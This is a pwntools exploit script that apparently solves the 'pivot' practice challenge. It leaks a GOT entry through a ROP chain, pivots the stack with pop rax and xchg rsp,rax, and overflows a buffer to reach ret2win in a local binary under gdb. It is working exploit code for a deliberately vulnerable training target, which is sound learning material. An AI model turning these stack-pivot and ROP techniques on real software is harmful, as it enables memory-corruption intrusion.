from pwn import *
import os

os.environ["SHELL"] = "/bin/sh"

context.binary = elf = ELF("./pivot")
context.arch = "amd64"
context.os = "linux"
context.terminal = ["st", "--", "/bin/sh", "-c"]

find_offset = cyclic(100)
offset = cyclic_find('kaaalaaa') # size of the second buffer

foothold_offset = 0x96a
ret2win_offset = 0xa81
got_offset = ret2win_offset - foothold_offset


# elements to use in the ROP chain

useless_function = 0x4009a8
foothold_function = 0x400720
foothold_got_plt = 0x601040
puts = 0x4006e0
main = elf.symbols['main']

pop_rdi = 0x400a33
pop_rsp_r13_r14_r15 = 0x400a2d
pop_rax = 0x4009bb
xchg_rsp_rax = 0x4009bd





gdb_script = '''
            break *0x400720
            break *pwnme+170
            continue
        '''


io = gdb.debug(elf.path, gdbscript=gdb_script)
#io = elf.process()

pause()


# isolating the pivot stack adderss from the output of the binary

input_1 = io.recv().decode()
print(input_1)
delimiter = input_1.find(":") + 1
pivot_addr = int(input_1[delimiter: delimiter + 15],16)
print(hex(pivot_addr))
print("OFFSET: ", offset)
print("Main address: ", hex(main))

# this paylaod will change call the foothold function and then change the .got.plt address to the ret2win function

payload_1 = flat(
       foothold_function,
       pop_rdi,
       foothold_got_plt,
       puts,
       main,
        )

# this payload will put the pivot_addr into the rsp register which will become the new stack location
payload_2 = flat(
        b'a' * offset,
        pop_rax,
        pivot_addr,
        xchg_rsp_rax,
        pivot_addr,
        )


payload_3 = flat(
        0x6969696969
        )


pause()
print("Pivot address: ",hex(pivot_addr))

print("SENDING PAYLOAD #1")

io.sendline(payload_1)

print(io.recv().decode())

pause()

print("SENDING PAYLOAD #2")

io.sendline(payload_2)

print(io.recvuntil(b'libpivot\n'))
ret2win = int(u64(io.recvuntil(b'\n').strip().ljust(8, b'\x00'))) - got_offset

print(ret2win)

payload_4 = flat(
        b'b' * offset,
        ret2win,
        )



pause()

print("SENDING PAYLOAD #3")
print(io.recv().decode())
io.sendline(payload_3)
print(io.recv().decode())

pause()

print("SENDING PAYLOAD #4")
io.sendline(payload_4)

print(io.recv().decode())
print(io.recv().decode())
print(io.recv().decode())

pause()
